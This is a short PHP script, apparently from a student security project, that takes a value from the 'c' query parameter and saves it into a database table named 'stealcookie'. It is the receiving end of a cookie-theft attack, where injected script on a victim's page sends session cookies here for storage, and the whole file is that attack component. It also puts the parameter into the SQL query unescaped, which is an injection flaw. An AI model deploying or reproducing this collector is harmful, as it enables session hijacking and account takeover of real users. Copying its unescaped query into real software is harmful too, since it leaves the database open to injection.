<?php  

ob_start();

require_once('connection.php');
$ck = $_GET["c"];
	$sql = "INSERT INTO szdoga.stealcookie (stolencookie) VALUES ('$ck')";
	$result = mysqli_query($kapcsolat, $sql);

?>

